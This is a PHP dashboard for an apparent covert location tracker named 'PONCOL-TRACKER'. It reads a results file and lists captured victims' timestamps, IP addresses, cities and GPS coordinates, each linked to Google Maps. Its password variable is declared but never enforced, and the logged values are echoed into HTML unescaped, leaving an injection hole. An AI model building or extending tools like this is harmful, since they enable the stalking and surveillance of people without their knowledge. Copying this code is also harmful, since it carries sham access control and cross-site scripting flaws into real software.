<?php
// Password sederhana agar tidak sembarang orang buka dashboard
$password = "poncol123"; 

echo "<!DOCTYPE html>
<html>
<head>
    <title>PONCOL-TRACKER DASHBOARD</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <style>
        body { font-family: Arial; background: #121212; color: white; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e1e1e; }
        th, td { border: 1px solid #333; padding: 12px; text-align: left; }
        th { background: #ff0000; }
        tr:nth-child(even) { background: #252525; }
        .btn { background: #008cba; color: white; padding: 5px 10px; text-decoration: none; border-radius: 3px; font-size: 12px; }
    </style>
</head>
<body>
    <h2>📍 PONCOL-TRACKER - Monitoring Room</h2>
    <p>Status: <span style='color:#00ff00'>ONLINE</span></p>
    <table>
        <tr>
            <th>Waktu</th>
            <th>IP Address</th>
            <th>Kota</th>
            <th>Aksi</th>
        </tr>";

if (file_exists("hasil.txt")) {
    $data = file("hasil.txt");
    foreach ($data as $line) {
        if (strpos($line, 'Waktu:') !== false) echo "<tr><td>" . str_replace('Waktu: ', '', $line) . "</td>";
        if (strpos($line, 'IP:') !== false) echo "<td>" . str_replace('IP: ', '', $line) . "</td>";
        if (strpos($line, 'Kota:') !== false) echo "<td>" . str_replace('Kota: ', '', $line) . "</td>";
        if (strpos($line, 'Koordinat:') !== false) {
            $coord = trim(str_replace('Koordinat: ', '', $line));
            echo "<td><a class='btn' href='https://www.google.com/maps?q=$coord' target='_blank'>Lihat Peta</a></td></tr>";
        }
    }
}

echo "    </table>
</body>
</html>";
?>
